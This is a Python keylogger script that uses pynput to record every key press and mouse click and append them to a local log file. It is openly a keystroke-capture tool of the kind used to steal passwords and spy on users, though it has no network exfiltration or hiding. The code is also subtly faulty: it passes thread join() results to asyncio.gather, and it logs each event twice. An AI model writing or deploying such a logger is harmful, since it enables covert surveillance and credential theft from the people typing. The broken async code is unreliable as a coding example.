import os
import asyncio
from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener

class Keylogger:
    def __init__(self):
        self.log_file = os.path.join(os.path.dirname(__file__), "logs", "log.txt")
        self.create_folder_tree()
        self.log_handle = open(self.log_file, "a")
        self.k_listener = None
        self.m_listener = None

    def create_folder_tree(self):
        folders = ["logs", "instructions"]
        for folder in folders:
            os.makedirs(os.path.join(os.path.dirname(__file__), folder), exist_ok=True)

    def on_press(self, key):
        print(f"Key pressed: {key}")  # Debug print
        self.log_handle.write(f"Key pressed: {key}\n")
        self.old_save_to_file(f"Key pressed: {key}\n")

    def on_click(self, x, y, button, pressed):
        print(f"Mouse clicked at ({x}, {y}) with button {button}")  # Debug print
        self.log_handle.write(f"Mouse clicked at ({x}, {y}) with button {button}\n")
        self.old_save_to_file(f"Mouse clicked at ({x}, {y}) with button {button}\n")

    async def start_logging(self):
        try:
            self.k_listener = KeyboardListener(on_press=self.on_press)
            self.m_listener = MouseListener(on_click=self.on_click)

            self.k_listener.start()
            self.m_listener.start()

            await asyncio.gather(self.k_listener.join(), self.m_listener.join())
        except Exception as e:
            print(f"Error: {e}")  # Debug print
        finally:
            self.stop_logging()

    def stop_logging(self):
        if self.k_listener:
            self.k_listener.stop()
        if self.m_listener:
            self.m_listener.stop()
        self.log_handle.close()

    def old_save_to_file(self, message):
        with open(os.path.join(os.path.dirname(__file__), "logs", "log.txt"), "a") as f:
            f.write(message)

async def main():
    keylogger = Keylogger()
    await keylogger.start_logging()

if __name__ == "__main__":
    asyncio.run(main())
